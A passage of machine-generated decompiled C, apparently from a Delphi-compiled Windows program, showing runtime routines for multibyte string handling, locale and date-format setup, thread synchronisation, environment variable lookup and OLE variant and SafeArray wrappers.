  if (0 < param_2) {
    iVar1 = FUN_004042f8((int)param_1);
    if (iVar1 < param_2) {
      param_2 = FUN_004042f8((int)param_1);
    }
    iVar1 = param_2;
    if (DAT_00419744 != '\0') {
      FUN_0040b25c(param_1,param_2,&local_c,&local_10);
      iVar2 = FUN_004042f8((int)param_1);
      iVar1 = local_10;
      if (iVar2 < local_10) {
        iVar1 = FUN_004042f8((int)param_1);
      }
    }
  }
  local_10 = iVar1;
  return local_10;
}



int FUN_0040b3b0(LPCSTR param_1)

{
  LPSTR pCVar1;
  
  if (DAT_00419744 != '\0') {
    pCVar1 = CharNextA(param_1);
    return (int)pCVar1 - (int)param_1;
  }
  return 1;
}



void FUN_0040b3d0(LPCSTR param_1)

{
  CharNextA(param_1);
  return;
}



int FUN_0040b3d8(undefined *param_1,int param_2)

{
  int iVar1;
  undefined *puVar2;
  
  iVar1 = 1;
  if ((DAT_00419744 != '\0') &&
     ((*(byte *)((int)&DAT_00418110 + ((int)(uint)(byte)param_1[param_2 + -1] >> 3)) >>
       ((byte)param_1[param_2 + -1] & 7) & 1) != 0)) {
    puVar2 = FUN_004044f8(param_1);
    iVar1 = FUN_0040b3b0(puVar2 + param_2 + -1);
  }
  return iVar1;
}



int FUN_0040b414(undefined *param_1,int param_2)

{
  undefined *puVar1;
  int iVar2;
  
  iVar2 = param_2 + 1;
  if ((DAT_00419744 != '\0') &&
     ((*(byte *)((int)&DAT_00418110 + ((int)(uint)(byte)param_1[param_2 + -1] >> 3)) >>
       ((byte)param_1[param_2 + -1] & 7) & 1) != 0)) {
    puVar1 = FUN_004044f8(param_1);
    iVar2 = FUN_0040b3b0(puVar1 + param_2 + -1);
    iVar2 = iVar2 + param_2;
  }
  return iVar2;
}



bool FUN_0040b450(undefined *param_1,undefined *param_2,int param_3)

{
  int iVar1;
  undefined4 uVar2;
  char *pcVar3;
  bool bVar4;
  
  bVar4 = false;
  if (0 < param_3) {
    iVar1 = FUN_004042f8((int)param_2);
    if (param_3 <= iVar1) {
      uVar2 = FUN_0040b1a0(param_2,param_3);
      if ((char)uVar2 == '\0') {
        pcVar3 = FUN_004044f8(param_1);
        pcVar3 = thunk_FUN_00407ada(pcVar3,param_2[param_3 + -1]);
        bVar4 = pcVar3 != (char *)0x0;
      }
    }
  }
  return bVar4;
}



PCNZCH FUN_0040b494(undefined *param_1,undefined *param_2)

{
  char *pcVar1;
  byte *pbVar2;
  PCNZCH pCVar3;
  PCNZCH pCVar4;
  
  pCVar4 = (PCNZCH)0x0;
  pcVar1 = FUN_004044f8(param_1);
  pbVar2 = FUN_004044f8(param_2);
  pCVar3 = FUN_0040b4cc(pbVar2,pcVar1);
  if (pCVar3 != (PCNZCH)0x0) {
    pCVar4 = pCVar3 + (1 - (int)pbVar2);
  }
  return pCVar4;
}



PCNZCH FUN_0040b4cc(byte *param_1,char *param_2)

{
  int iVar1;
  uint cchCount1;
  char *lpString1;
  undefined4 uVar2;
  int iVar3;
  
  if ((((param_1 != (byte *)0x0) && (*param_1 != 0)) && (param_2 != (char *)0x0)) &&
     (*param_2 != '\0')) {
    iVar1 = FUN_00407a30((char *)param_1);
    cchCount1 = FUN_00407a30(param_2);
    for (lpString1 = FUN_00407ae4((char *)param_1,param_2);
        (lpString1 != (PCNZCH)0x0 && (cchCount1 <= (uint)(iVar1 - ((int)lpString1 - (int)param_1))))
        ; lpString1 = FUN_00407ae4(lpString1 + 1,param_2)) {
      uVar2 = FUN_0040b1c4(param_1,(int)lpString1 - (int)param_1);
      if (((char)uVar2 != '\x02') &&
         (iVar3 = CompareStringA(0x400,0,lpString1,cchCount1,param_2,cchCount1), iVar3 == 2)) {
        return lpString1;
      }
      if ((char)uVar2 == '\x01') {
        lpString1 = lpString1 + 1;
      }
    }
  }
  return (PCNZCH)0x0;
}



char * FUN_0040b56c(byte *param_1,char param_2)

{
  char *pcVar1;
  char *pcVar2;
  char *pcVar3;
  
  pcVar2 = FUN_0040b594(param_1,param_2);
  pcVar3 = pcVar2;
  if (param_2 != '\0') {
    while (pcVar1 = pcVar3, pcVar1 != (char *)0x0) {
      pcVar3 = FUN_0040b594((byte *)(pcVar1 + 1),param_2);
      pcVar2 = pcVar1;
    }
  }
  return pcVar2;
}



char * FUN_0040b594(byte *param_1,char param_2)

{
  char *pcVar1;
  undefined4 uVar2;
  
  pcVar1 = thunk_FUN_00407ada((char *)param_1,param_2);
  while( true ) {
    if (pcVar1 == (char *)0x0) {
      return (char *)0x0;
    }
    uVar2 = FUN_0040b1c4(param_1,(int)pcVar1 - (int)param_1);
    if ((char)uVar2 == '\0') break;
    if ((char)uVar2 == '\x01') {
      pcVar1 = pcVar1 + 1;
    }
    pcVar1 = thunk_FUN_00407ada(pcVar1 + 1,param_2);
  }
  return pcVar1;
}



void FUN_0040b5d4(LCID param_1)

{
  byte *pbVar1;
  int extraout_ECX;
  undefined4 *in_FS_OFFSET;
  byte *pbVar2;
  undefined4 uStack_20;
  undefined *puStack_1c;
  undefined *puStack_18;
  byte *local_10;
  undefined4 local_b;
  
  puStack_18 = &stack0xfffffffc;
  local_10 = (byte *)0x0;
  puStack_1c = &LAB_0040b638;
  uStack_20 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_20;
  GetLocaleInfoA(param_1,0x1004,(LPSTR)&local_b,7);
  FUN_004042cc((int *)&local_10,&local_b,7);
  pbVar2 = local_10;
  pbVar1 = (byte *)GetACP();
  FUN_00407398(pbVar2,pbVar1,extraout_ECX);
  *in_FS_OFFSET = uStack_20;
  puStack_18 = &LAB_0040b63f;
  puStack_1c = (undefined *)0x40b637;
  FUN_0040405c((int *)&local_10);
  return;
}



void FUN_0040b648(undefined param_1,undefined param_2,undefined param_3,int param_4)

{
  byte bVar1;
  byte *pbVar2;
  UINT CodePage;
  char cVar3;
  int iVar4;
  LPCPINFO lpCPInfo;
  byte local_5;
  
  lpCPInfo = (LPCPINFO)(param_4 + -0x14);
  CodePage = FUN_0040b5d4(DAT_00419738);
  GetCPInfo(CodePage,lpCPInfo);
  for (iVar4 = 0;
      (iVar4 < 0xc && ((*(byte *)(param_4 + -0xe + iVar4) | *(byte *)(param_4 + -0xd + iVar4)) != 0)
      ); iVar4 = iVar4 + 2) {
    local_5 = *(byte *)(param_4 + -0xe + iVar4);
    bVar1 = *(byte *)(param_4 + -0xd + iVar4);
    if (local_5 <= bVar1) {
      cVar3 = (bVar1 - local_5) + '\x01';
      do {
        pbVar2 = (byte *)((int)&DAT_00418110 + ((int)(uint)local_5 >> 3));
        *pbVar2 = *pbVar2 | '\x01' << (local_5 & 7);
        local_5 = local_5 + 1;
        cVar3 = cVar3 + -1;
      } while (cVar3 != '\0');
    }
  }
  return;
}



undefined4 FUN_0040b6a8(void)

{
  bool bVar1;
  
  bVar1 = DAT_0041973c < 0x1f;
  if (DAT_0041973c < 0x20) {
    bVar1 = ((byte)(&DAT_00418308)[(int)DAT_0041973c >> 3] >> (DAT_0041973c & 7) & 1) != 0;
  }
  return CONCAT31((int3)(DAT_0041973c >> 8),bVar1);
}



void FUN_0040b6c0(void)

{
  LCID LVar1;
  undefined4 uVar2;
  undefined extraout_CL;
  undefined extraout_CL_00;
  int iVar3;
  undefined extraout_DL;
  undefined extraout_DL_00;
  CHAR *pCVar4;
  WORD *pWVar5;
  undefined4 *puVar6;
  undefined4 *puVar7;
  undefined uVar8;
  undefined *puVar9;
  WORD local_19a [129];
  CHAR local_98 [148];
  
  puVar9 = &stack0xfffffffc;
  DAT_00419738 = 0x409;
  DAT_0041973c = 9;
  DAT_00419740 = 1;
  LVar1 = GetThreadLocale();
  if (LVar1 != 0) {
    DAT_00419738 = LVar1;
  }
  if ((ushort)LVar1 != 0) {
    DAT_0041973c = (uint)((ushort)LVar1 & 0x3ff);
    DAT_00419740 = (LVar1 & 0xffff) >> 10;
  }
  puVar6 = &DAT_0040b814;
  puVar7 = &DAT_00418110;
  for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar7 = *puVar6;
    puVar6 = puVar6 + 1;
    puVar7 = puVar7 + 1;
  }
  if (DAT_004180c8 == 2) {
    uVar2 = FUN_0040b6a8();
    uVar8 = (char)uVar2 == '\0';
    if ((bool)uVar8) {
      FUN_0040b648(0,extraout_DL,extraout_CL,&stack0xfffffffc);
      FUN_00403110((char *)&DAT_00418110,(char *)&DAT_0040b814,
                   CONCAT31((int3)((uint)puVar9 >> 8),0x20));
      DAT_00419744 = !(bool)uVar8;
      if ((bool)DAT_00419744) {
        DAT_00419745 = 0;
      }
      else {
        iVar3 = 0x80;
        pCVar4 = local_98;
        do {
          *pCVar4 = (CHAR)iVar3;
          iVar3 = iVar3 + 1;
          pCVar4 = pCVar4 + 1;
        } while (iVar3 != 0x100);
        GetStringTypeExA(DAT_00419738,2,local_98,0x80,local_19a);
        iVar3 = 0x80;
        pWVar5 = local_19a;
        do {
          DAT_00419745 = *pWVar5 == 2;
          if ((bool)DAT_00419745) {
            return;
          }
          pWVar5 = pWVar5 + 1;
          iVar3 = iVar3 + -1;
        } while (iVar3 != 0);
      }
    }
    else {
      DAT_00419745 = 0;
      DAT_00419744 = 0;
    }
  }
  else {
    iVar3 = GetSystemMetrics(0x4a);
    DAT_00419745 = iVar3 != 0;
    iVar3 = GetSystemMetrics(0x2a);
    DAT_00419744 = iVar3 != 0;
    if ((bool)DAT_00419744) {
      FUN_0040b648((char)iVar3,extraout_DL_00,extraout_CL_00,&stack0xfffffffc);
    }
  }
  return;
}



void FUN_0040b834(void)

{
  LCID LVar1;
  byte *pbVar2;
  uint uVar3;
  int iVar4;
  int extraout_ECX;
  int extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  int extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 extraout_ECX_05;
  int extraout_ECX_06;
  int extraout_ECX_07;
  int extraout_ECX_08;
  undefined4 extraout_ECX_09;
  byte *unaff_EBX;
  byte **in_FS_OFFSET;
  byte *local_44;
  byte *local_40;
  byte *local_3c;
  undefined4 *local_38;
  undefined4 *local_34;
  undefined4 *local_30;
  undefined4 *local_2c;
  undefined4 *local_28;
  undefined4 *local_24;
  int *piVar5;
  byte *local_1c;
  byte *local_18;
  undefined4 *local_14;
  undefined4 *local_c;
  undefined4 *local_8;
  
  local_14 = (undefined4 *)&stack0xfffffffc;
  iVar4 = 8;
  do {
    local_8 = (undefined4 *)0x0;
    iVar4 = iVar4 + -1;
  } while (iVar4 != 0);
  local_18 = &LAB_0040baff;
  local_1c = *in_FS_OFFSET;
  *in_FS_OFFSET = (byte *)&local_1c;
  FUN_0040b6c0();
  FUN_0040a1ec();
  if (DAT_00419744 != '\0') {
    FUN_0040a3c4();
  }
  LVar1 = GetThreadLocale();
  local_24 = (undefined4 *)0x40b883;
  FUN_0040a13c(LVar1,0x14,(undefined4 *)0x0,(int *)&local_14);
  FUN_004040b0(&DAT_00419678,local_14);
  local_24 = (undefined4 *)0x40b8a5;
  FUN_0040a13c(LVar1,0x1b,(undefined4 *)&DAT_0040bb14,(int *)&local_18);
  pbVar2 = FUN_00407398(local_18,(byte *)0x0,extraout_ECX);
  DAT_0041967c = SUB41(pbVar2,0);
  local_24 = (undefined4 *)0x40b8c9;
  FUN_0040a13c(LVar1,0x1c,(undefined4 *)&DAT_0040bb14,(int *)&local_1c);
  pbVar2 = FUN_00407398(local_1c,(byte *)0x0,extraout_ECX_00);
  DAT_0041967d = SUB41(pbVar2,0);
  uVar3 = FUN_0040a188(LVar1,0xf,CONCAT31((int3)((uint)extraout_ECX_01 >> 8),0x2c));
  DAT_0041967e = (undefined)uVar3;
  uVar3 = FUN_0040a188(LVar1,0xe,CONCAT31((int3)((uint)extraout_ECX_02 >> 8),0x2e));
  DAT_0041967f = (undefined)uVar3;
  piVar5 = (int *)&stack0xffffffe0;
  local_24 = (undefined4 *)0x40b913;
  FUN_0040a13c(LVar1,0x19,(undefined4 *)&DAT_0040bb14,piVar5);
  pbVar2 = FUN_00407398((byte *)piVar5,(byte *)0x0,extraout_ECX_03);
  DAT_00419680 = SUB41(pbVar2,0);
  uVar3 = FUN_0040a188(LVar1,0x1d,CONCAT31((int3)((uint)extraout_ECX_04 >> 8),0x2f));
  DAT_00419681 = (undefined)uVar3;
  local_24 = (undefined4 *)0x40b94a;
  FUN_0040a13c(LVar1,0x1f,(undefined4 *)s_m_d_yy_0040bb20,(int *)&local_28);
  FUN_0040a474(local_28,(int *)&local_24);
  FUN_004040b0(&DAT_00419684,local_24);
  local_24 = (undefined4 *)0x40b977;
  FUN_0040a13c(LVar1,0x20,(undefined4 *)s_mmmm_d__yyyy_0040bb30,(int *)&local_30);
  FUN_0040a474(local_30,(int *)&local_2c);
  FUN_004040b0(&DAT_00419688,local_2c);
  uVar3 = FUN_0040a188(LVar1,0x1e,CONCAT31((int3)((uint)extraout_ECX_05 >> 8),0x3a));
  DAT_0041968c = (undefined)uVar3;
  local_24 = (undefined4 *)0x40b9b7;
  FUN_0040a13c(LVar1,0x28,(undefined4 *)&DAT_0040bb48,(int *)&local_34);
  FUN_004040b0(&DAT_00419690,local_34);
  local_24 = (undefined4 *)0x40b9d9;
  FUN_0040a13c(LVar1,0x29,(undefined4 *)&DAT_0040bb54,(int *)&local_38);
  FUN_004040b0(&DAT_00419694,local_38);
  FUN_0040405c((int *)&local_c);
  FUN_0040405c((int *)&stack0xfffffff0);
  local_24 = (undefined4 *)0x40ba0b;
  FUN_0040a13c(LVar1,0x25,(undefined4 *)&DAT_0040bb14,(int *)&local_3c);
  pbVar2 = FUN_00407398(local_3c,(byte *)0x0,extraout_ECX_06);
  if (pbVar2 == (byte *)0x0) {
    FUN_004040f4((int *)&local_8,0x40bb60);
  }
  else {
    FUN_004040f4((int *)&local_8,0x40bb6c);
  }
  local_24 = (undefined4 *)0x40ba4a;
  FUN_0040a13c(LVar1,0x23,(undefined4 *)&DAT_0040bb14,(int *)&local_40);
  pbVar2 = FUN_00407398(local_40,(byte *)0x0,extraout_ECX_07);
  if (pbVar2 == (byte *)0x0) {
    local_24 = (undefined4 *)0x40ba6d;
    FUN_0040a13c(LVar1,0x1005,(undefined4 *)&DAT_0040bb14,(int *)&local_44);
    pbVar2 = FUN_00407398(local_44,(byte *)0x0,extraout_ECX_08);
    if (pbVar2 == (byte *)0x0) {
      FUN_004040f4((int *)&stack0xfffffff0,0x40bb78);
    }
    else {
      FUN_004040f4((int *)&local_c,0x40bb88);
    }
  }
  local_24 = local_8;
  local_28 = (undefined4 *)&DAT_0040bb98;
  local_30 = (undefined4 *)0x40bab4;
  FUN_004043b8(&DAT_00419698,4);
  local_30 = local_c;
  local_34 = local_8;
  local_38 = (undefined4 *)s__mm_ss_0040bba4;
  local_40 = (byte *)0x40bad1;
  local_3c = unaff_EBX;
  FUN_004043b8(&DAT_0041969c,4);
  local_40 = (byte *)0x40badf;
  uVar3 = FUN_0040a188(LVar1,0xc,CONCAT31((int3)((uint)extraout_ECX_09 >> 8),0x2c));
  DAT_00419746 = (undefined)uVar3;
  *in_FS_OFFSET = local_3c;
  local_34 = (undefined4 *)&LAB_0040bb06;
  local_38 = (undefined4 *)0x40bafe;
  FUN_00404080((int *)&local_44,0x10);
  return;
}



void __stdcall Sleep(DWORD dwMilliseconds)

{
                    // WARNING: Could not recover jumptable at 0x0040bbac. Too many branches
                    // WARNING: Treating indirect jump as call
  Sleep(dwMilliseconds);
  return;
}



void FUN_0040bbb4(void)

{
  DWORD DVar1;
  int *piVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffd0;
  undefined *puStack_28;
  undefined *puStack_24;
  undefined *puStack_20;
  int local_18;
  DWORD local_14;
  undefined local_10;
  int local_c;
  undefined local_8;
  
  puStack_20 = &stack0xfffffffc;
  local_18 = 0;
  puStack_24 = &LAB_0040bc44;
  puStack_28 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack_28;
  DVar1 = GetLastError();
  if (DVar1 == 0) {
    piVar2 = FUN_0040a9b4((int *)PTR_DAT_00406d74,'\x01',(int **)PTR_PTR_DAT_004186c0);
  }
  else {
    local_10 = 0;
    local_14 = DVar1;
    FUN_0040a0f0(DVar1,&local_18);
    local_c = local_18;
    local_8 = 0xb;
    in_stack_ffffffd0 = 1;
    piVar2 = (int *)FUN_0040a9f0((int)PTR_DAT_00406d74,'\x01',(int **)PTR_PTR_DAT_0041864c,1,
                                 &local_14);
  }
  piVar2[3] = DVar1;
  FUN_00403abc((int)piVar2);
  *in_FS_OFFSET = in_stack_ffffffd0;
  puStack_28 = &LAB_0040bc4b;
  FUN_0040405c(&local_18);
  return;
}



int FUN_0040bc50(int param_1)

{
  if (param_1 == 0) {
    FUN_0040bbb4();
  }
  return param_1;
}



void FUN_0040bc60(void)

{
  undefined4 *puVar1;
  
  while (puVar1 = DAT_0041830c, DAT_0041830c != (undefined4 *)0x0) {
    DAT_0041830c = (undefined4 *)*DAT_0041830c;
    FUN_004026b0((int)puVar1);
  }
  return;
}



void FUN_0040bc80(void)

{
  HMODULE hModule;
  
  hModule = GetModuleHandleA(s_kernel32_dll_0040bcb8);
  if (hModule != (HMODULE)0x0) {
    DAT_00418134 = GetProcAddress(hModule,s_GetDiskFreeSpaceExA_0040bcc8);
  }
  if (DAT_00418134 == (FARPROC)0x0) {
    DAT_00418134 = (FARPROC)&LAB_0040797c;
  }
  return;
}



int FUN_0040bcdc(int *param_1)

{
  int iVar1;
  
  LOCK();
  iVar1 = *param_1;
  *param_1 = *param_1 + 1;
  UNLOCK();
  return iVar1 + 1;
}



int FUN_0040bce8(int *param_1)

{
  int iVar1;
  
  LOCK();
  iVar1 = *param_1;
  *param_1 = *param_1 + -1;
  UNLOCK();
  return iVar1 + -1;
}



undefined4 FUN_0040bcf4(undefined4 *param_1,undefined4 param_2)

{
  undefined4 uVar1;
  
  LOCK();
  uVar1 = *param_1;
  *param_1 = param_2;
  UNLOCK();
  return uVar1;
}



int FUN_0040bcfc(int *param_1,int param_2)

{
  int iVar1;
  
  LOCK();
  iVar1 = *param_1;
  *param_1 = *param_1 + param_2;
  UNLOCK();
  return iVar1;
}



uint FUN_0040bd54(void)

{
  DWORD DVar1;
  byte local_6;
  byte bStack_5;
  
  DVar1 = GetCurrentThreadId();
  local_6 = (byte)(DVar1 & 0xffff);
  bStack_5 = (byte)((DVar1 & 0xffff) >> 8);
  return CONCAT31((int3)(DVar1 >> 8),local_6 ^ bStack_5) & 0xffffff0f;
}



void FUN_0040bd6c(int param_1,undefined4 *param_2)

{
  uint uVar1;
  DWORD DVar2;
  undefined4 *puVar3;
  undefined4 uVar4;
  
  uVar1 = FUN_0040bd54();
  DVar2 = GetCurrentThreadId();
  for (puVar3 = *(undefined4 **)(param_1 + 4 + (uVar1 & 0xff) * 4);
      (puVar3 != (undefined4 *)0x0 && (DVar2 != puVar3[1])); puVar3 = (undefined4 *)*puVar3) {
  }
  if (puVar3 == (undefined4 *)0x0) {
    puVar3 = FUN_0040bdf4(param_1);
    if (puVar3 == (undefined4 *)0x0) {
      puVar3 = FUN_00407028(0x10);
      puVar3[1] = DVar2;
      puVar3[2] = 0x7fffffff;
      *puVar3 = puVar3;
      uVar4 = FUN_0040bcf4((undefined4 *)(param_1 + 4 + (uVar1 & 0xff) * 4),puVar3);
      *puVar3 = uVar4;
    }
  }
  *param_2 = puVar3;
  return;
}



void FUN_0040bde4(undefined4 param_1,int *param_2)

{
  *(undefined4 *)(*param_2 + 4) = 0;
  *(undefined4 *)(*param_2 + 8) = 0;
  return;
}



undefined4 * FUN_0040bdf4(int param_1)

{
  undefined4 *puVar1;
  uint uVar2;
  int iVar3;
  DWORD DVar4;
  
  uVar2 = FUN_0040bd54();
  puVar1 = *(undefined4 **)(param_1 + 4 + (uVar2 & 0xff) * 4);
  while( true ) {
    if (puVar1 == (undefined4 *)0x0) {
      return (undefined4 *)0x0;
    }
    iVar3 = FUN_0040bcf4(puVar1 + 2,0x7fffffff);
    if (iVar3 != 0x7fffffff) break;
    puVar1 = (undefined4 *)*puVar1;
  }
  DVar4 = GetCurrentThreadId();
  puVar1[1] = DVar4;
  return puVar1;
}



int * FUN_0040be34(int *param_1,char param_2,undefined4 param_3)

{
  HANDLE pvVar1;
  int iVar2;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  undefined4 in_stack_fffffff4;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_004037f0((int)param_1,param_2,param_3,in_stack_ffffffe8,in_stack_ffffffec,
                                  in_stack_fffffff0,in_stack_fffffff4);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_00403578(param_1,'\0',param_3);
  param_1[3] = 0xffff;
  pvVar1 = CreateEventA((LPSECURITY_ATTRIBUTES)0x0,-1,-1,(LPCSTR)0x0);
  param_1[4] = (int)pvVar1;
  pvVar1 = CreateEventA((LPSECURITY_ATTRIBUTES)0x0,0,0,(LPCSTR)0x0);
  param_1[5] = (int)pvVar1;
  param_1[6] = -1;
  iVar2 = FUN_00403578((int *)PTR_DAT_00406e80,'\x01',extraout_ECX_00);
  param_1[8] = iVar2;
  if (param_2 != '\0') {
    FUN_00403848(param_1);
    *in_FS_OFFSET = in_stack_ffffffe8;
  }
  return param_1;
}



void FUN_0040bef0(int param_1)

{
  ResetEvent(*(HANDLE *)(param_1 + 0x10));
  return;
}



void FUN_0040befc(int param_1)

{
  SetEvent(*(HANDLE *)(param_1 + 0x10));
  return;
}



void FUN_0040bf08(int param_1)

{
  SetEvent(*(HANDLE *)(param_1 + 0x14));
  return;
}



void FUN_0040bf14(int param_1)

{
  WaitForSingleObject(*(HANDLE *)(param_1 + 0x10),*(DWORD *)(param_1 + 0x18));
  return;
}



void FUN_0040bf24(int param_1)

{
  WaitForSingleObject(*(HANDLE *)(param_1 + 0x14),*(DWORD *)(param_1 + 0x18));
  return;
}



bool FUN_0040bf34(int param_1,undefined4 param_2,int param_3)

{
  int iVar1;
  DWORD DVar2;
  int iVar3;
  bool bVar4;
  int local_14;
  
  bVar4 = true;
  local_14 = param_3;
  DVar2 = GetCurrentThreadId();
  if (DVar2 != *(DWORD *)(param_1 + 0x24)) {
    FUN_0040bef0(param_1);
    iVar1 = *(int *)(param_1 + 0x28);
    FUN_0040bd6c(*(int *)(param_1 + 0x20),&local_14);
    bVar4 = *(int *)(local_14 + 0xc) != 0;
    if (bVar4) {
      FUN_0040bcdc((int *)(param_1 + 0xc));
    }
    while( true ) {
      iVar3 = FUN_0040bcfc((int *)(param_1 + 0xc),-0xffff);
      if (iVar3 == 0xffff) break;
      iVar3 = FUN_0040bcfc((int *)(param_1 + 0xc),0xffff);
      if (iVar3 != 0) {
        FUN_0040bf24(param_1);
      }
    }
    FUN_0040bef0(param_1);
    if (bVar4) {
      FUN_0040bce8((int *)(param_1 + 0xc));
    }
    *(DWORD *)(param_1 + 0x24) = DVar2;
    iVar3 = FUN_0040bcdc((int *)(param_1 + 0x28));
    bVar4 = iVar3 + -1 == iVar1;
  }
  *(int *)(param_1 + 0x1c) = *(int *)(param_1 + 0x1c) + 1;
  return bVar4;
}



void FUN_0040c0f4(int **param_1)

{
  int *piVar1;
  
  piVar1 = *param_1;
  *param_1 = (int *)0x0;
  FUN_004035a8(piVar1);
  return;
}



void FUN_0040c104(undefined *param_1,int *param_2)

{
  LPCSTR lpName;
  LPSTR pCVar1;
  DWORD DVar2;
  
  FUN_0040405c(param_2);
  DVar2 = 0;
  pCVar1 = (LPSTR)0x0;
  lpName = FUN_004044f8(param_1);
  DVar2 = GetEnvironmentVariableA(lpName,pCVar1,DVar2);
  if (0 < (int)DVar2) {
    FUN_00404628(param_2,DVar2 - 1);
    pCVar1 = FUN_004044f8((undefined *)*param_2);
    GetEnvironmentVariableA(lpName,pCVar1,DVar2);
  }
  return;
}



void __stdcall VariantInit(VARIANTARG *pvarg)

{
                    // WARNING: Could not recover jumptable at 0x0040c654. Too many branches
                    // WARNING: Treating indirect jump as call
  VariantInit(pvarg);
  return;
}



HRESULT __stdcall VariantClear(VARIANTARG *pvarg)

{
  HRESULT HVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040c65c. Too many branches
                    // WARNING: Treating indirect jump as call
  HVar1 = VariantClear(pvarg);
  return HVar1;
}



HRESULT __stdcall VariantCopy(VARIANTARG *pvargDest,VARIANTARG *pvargSrc)

{
  HRESULT HVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040c664. Too many branches
                    // WARNING: Treating indirect jump as call
  HVar1 = VariantCopy(pvargDest,pvargSrc);
  return HVar1;
}



HRESULT __stdcall
VariantChangeType(VARIANTARG *pvargDest,VARIANTARG *pvarSrc,USHORT wFlags,VARTYPE vt)

{
  HRESULT HVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040c66c. Too many branches
                    // WARNING: Treating indirect jump as call
  HVar1 = VariantChangeType(pvargDest,pvarSrc,wFlags,vt);
  return HVar1;
}



undefined4 FUN_0040c6b0(void)

{
  return 0x80004001;
}



undefined4 FUN_0040c6bc(void)

{
  return 0x80004001;
}



void FUN_0040c6c8(undefined param_1,undefined param_2,undefined param_3,LPCWSTR param_4,int param_5,
                 undefined param_6,byte **param_7)

{
  int extraout_ECX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_18;
  undefined *puStack_14;
  undefined *puStack_10;
  byte *local_8;
  
  puStack_10 = &stack0xfffffffc;
  local_8 = (byte *)0x0;
  puStack_14 = &LAB_0040c722;
  uStack_18 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_18;
  if (param_5 == 0x400) {
    FUN_004042e4((LPSTR *)&local_8,param_4);
    FUN_004073b0(local_8,param_7,extraout_ECX);
  }
  *in_FS_OFFSET = uStack_18;
  puStack_10 = &LAB_0040c729;
  puStack_14 = (undefined *)0x40c721;
  FUN_0040405c((int *)&local_8);
  return;
}



SAFEARRAY * __stdcall SafeArrayCreate(VARTYPE vt,UINT cDims,SAFEARRAYBOUND *rgsabound)

{
  SAFEARRAY *pSVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040cab8. Too many branches
                    // WARNING: Treating indirect jump as call
  pSVar1 = SafeArrayCreate(vt,cDims,rgsabound);
  return pSVar1;
}



HRESULT __stdcall SafeArrayGetLBound(SAFEARRAY *psa,UINT nDim,LONG *plLbound)

{
  HRESULT HVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040cac0. Too many branches
                    // WARNING: Treating indirect jump as call
  HVar1 = SafeArrayGetLBound(psa,nDim,plLbound);
  return HVar1;
}



HRESULT __stdcall SafeArrayGetUBound(SAFEARRAY *psa,UINT nDim,LONG *plUbound)

{
  HRESULT HVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040cac8. Too many branches
                    // WARNING: Treating indirect jump as call
  HVar1 = SafeArrayGetUBound(psa,nDim,plUbound);
  return HVar1;
}



HRESULT __stdcall SafeArrayPtrOfIndex(SAFEARRAY *psa,LONG *rgIndices,void **ppvData)

{
  HRESULT HVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040cad0. Too many branches
                    // WARNING: Treating indirect jump as call
  HVar1 = SafeArrayPtrOfIndex(psa,rgIndices,ppvData);
  return HVar1;
}



FARPROC FUN_0040cad8(LPCSTR param_1,FARPROC param_2,undefined4 param_3,int param_4)

{
  FARPROC pFVar1;
  
  pFVar1 = param_2;
  if (*(int *)(param_4 + -4) != 0) {
    pFVar1 = GetProcAddress(*(HMODULE *)(param_4 + -4),param_1);
    if (pFVar1 == (FARPROC)0x0) {
      pFVar1 = param_2;
    }
  }
  return pFVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0040cb04(void)

{
  undefined4 extraout_ECX;
  undefined *puVar1;
  undefined *puVar2;
  undefined *puVar3;
  undefined *puVar4;
  undefined *puVar5;
  undefined *puVar6;
  undefined *puVar7;
  undefined *puVar8;
  undefined *puVar9;
  undefined *puVar10;
  undefined *puVar11;
  undefined *puVar12;
  undefined *puVar13;
  undefined *puVar14;
  undefined *puVar15;
  undefined *puVar16;
  undefined *puVar17;
  undefined *puVar18;
  undefined *puVar19;
  undefined *puVar20;
  undefined *puVar21;
  
  puVar1 = &stack0xfffffffc;
  puVar2 = &stack0xfffffffc;
  puVar3 = &stack0xfffffffc;
  puVar4 = &stack0xfffffffc;
  puVar5 = &stack0xfffffffc;
  puVar6 = &stack0xfffffffc;
  puVar7 = &stack0xfffffffc;
  puVar8 = &stack0xfffffffc;
  puVar9 = &stack0xfffffffc;
  puVar10 = &stack0xfffffffc;
  puVar11 = &stack0xfffffffc;
  puVar12 = &stack0xfffffffc;
  puVar13 = &stack0xfffffffc;
  puVar14 = &stack0xfffffffc;
  puVar15 = &stack0xfffffffc;
  puVar16 = &stack0xfffffffc;
  puVar17 = &stack0xfffffffc;
  puVar18 = &stack0xfffffffc;
  puVar19 = &stack0xfffffffc;
  puVar20 = &stack0xfffffffc;
  puVar21 = &stack0xfffffffc;
  GetModuleHandleA(s_oleaut32_dll_0040ccfc);
  DAT_0041979c = FUN_0040cad8(s_VariantChangeTypeEx_0040cd0c,(FARPROC)&LAB_0040c674,extraout_ECX,
                              (int)&stack0xfffffffc);
  _DAT_004197a0 =
       FUN_0040cad8(s_VarNeg_0040cd20,(FARPROC)&LAB_0040c6a4,puVar1,(int)&stack0xfffffffc);
  _DAT_004197a4 =
       FUN_0040cad8(s_VarNot_0040cd28,(FARPROC)&LAB_0040c6a4,puVar2,(int)&stack0xfffffffc);
